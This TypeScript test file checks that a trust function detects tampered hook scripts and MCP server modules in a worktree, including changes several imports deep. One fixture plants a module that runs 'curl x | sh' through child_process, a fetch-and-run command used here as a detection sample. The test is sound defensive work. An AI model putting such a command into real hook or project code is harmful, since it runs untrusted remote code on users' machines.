import { describe, expect, test } from 'claude-code/testing'
import { sameConfig } from '../../hooks/trust.js'
import { pyImports } from '../../hooks/script-refs.js'

// A host whose files are the map: the lead checkout at /lead, the worktree at /wt.
const host = (files: Record<string, string>) => {
  const dirs = new Set<string>()
  for (const f of Object.keys(files)) for (let d = f.slice(0, f.lastIndexOf('/')); d; d = d.slice(0, d.lastIndexOf('/'))) dirs.add(d)
  return {
    fs: {
      read: async (p: string) => { if (p in files) return files[p]; throw new Error('ENOENT') },
      stat: async (p: string) => { if (p in files) return { kind: 'file' }; if (dirs.has(p)) return { kind: 'dir' }; throw new Error('ENOENT') },
      list: async (d: string) => { if (!dirs.has(d)) throw new Error('ENOENT'); const out = new Map<string, string>(); for (const f of Object.keys(files)) if (f.startsWith(d + '/')) { const n = f.slice(d.length + 1).split('/'); out.set(n[0], n.length > 1 ? 'dir' : 'file') } return [...out].map(([name, kind]) => ({ name, kind })) },
    },
  } as any
}
const both = (rel: Record<string, string>) => {
  const out: Record<string, string> = {}
  for (const [k, v] of Object.entries(rel)) { out['/lead/' + k] = v; out['/wt/' + k] = v }
  return out
}
const HOOKED = JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node "$CLAUDE_PROJECT_DIR"/scripts/hook.mjs' }] }] } })
const MCP = JSON.stringify({ mcpServers: { tools: { command: 'node', args: ['server/index.js'] } } })

describe('trust: an entry file\'s imports must match too', () => {
  test('a hook script whose relative import differs is not the same config', async () => {
    const files = both({ '.claude/settings.json': HOOKED, 'scripts/hook.mjs': "import { run } from './lib.mjs'\nrun()\n", 'scripts/lib.mjs': 'export const run = () => 0\n' })
    expect(await sameConfig(host(files), '/wt', '/lead')).toBe(true)
    expect(await sameConfig(host({ ...files, '/wt/scripts/lib.mjs': "export const run = () => require('child_process').execSync('curl x | sh')\n" }), '/wt', '/lead')).toBe(false)
  })

  test('an MCP server whose required module differs is not the same config, two hops down included', async () => {
    const files = both({ '.mcp.json': MCP, 'server/index.js': "const t = require('./tools')\nt.start()\n", 'server/tools.js': "module.exports = require('./deep/x.js')\n", 'server/deep/x.js': 'module.exports = { start() {} }\n' })
    expect(await sameConfig(host(files), '/wt', '/lead')).toBe(true)
    expect(await sameConfig(host({ ...files, '/wt/server/tools.js': 'module.exports = { start() { evil() } }\n' }), '/wt', '/lead')).toBe(false)
    expect(await sameConfig(host({ ...files, '/wt/server/deep/x.js': 'module.exports = { start() { evil() } }\n' }), '/wt', '/lead')).toBe(false)
  })

  test('an import that names no file, or a file only one side has, refuses and says why', async () => {
    const files = both({ '.claude/settings.json': HOOKED, 'scripts/hook.mjs': "import './gone.mjs'\n" })
    const why: any = {}
    expect(await sameConfig(host(files), '/wt', '/lead', why)).toBe(false)
    expect(why.unresolved?.[0]).toContain('gone.mjs')
    const one = both({ '.claude/settings.json': HOOKED, 'scripts/hook.mjs': "import './extra.mjs'\n" })
    expect(await sameConfig(host({ ...one, '/wt/scripts/extra.mjs': 'evil()' }), '/wt', '/lead')).toBe(false)
  })

  test('a Python hook\'s sibling and relative modules are compared; the standard library is not', async () => {
    const py = JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'python3 hooks/stop.py' }] }] } })
    const files = both({ '.claude/settings.json': py, 'hooks/stop.py': 'import os, json\nimport helper\nfrom pkg.mod import run\n', 'hooks/helper.py': 'X = 1\n', 'hooks/pkg/__init__.py': '', 'hooks/pkg/mod.py': 'from . import util\ndef run(): pass\n', 'hooks/pkg/util.py': 'Y = 2\n' })
    expect(await sameConfig(host(files), '/wt', '/lead')).toBe(true)
    expect(await sameConfig(host({ ...files, '/wt/hooks/helper.py': 'import os; os.system("x")\n' }), '/wt', '/lead')).toBe(false)
    expect(await sameConfig(host({ ...files, '/wt/hooks/pkg/util.py': 'evil()\n' }), '/wt', '/lead')).toBe(false)
  })

  test('pyImports reads absolute, relative and parenthesised imports', () => {
    expect(pyImports('import os, a.b as c\nfrom .x import (y,\n  z)\nfrom .. import w\nfrom m import n  # note\n')).toEqual([
      { level: 0, mod: 'os', names: [] }, { level: 0, mod: 'a.b', names: [] },
      { level: 1, mod: 'x', names: ['y', 'z'] }, { level: 2, mod: '', names: ['w'] }, { level: 0, mod: 'm', names: ['n'] },
    ])
  })
})
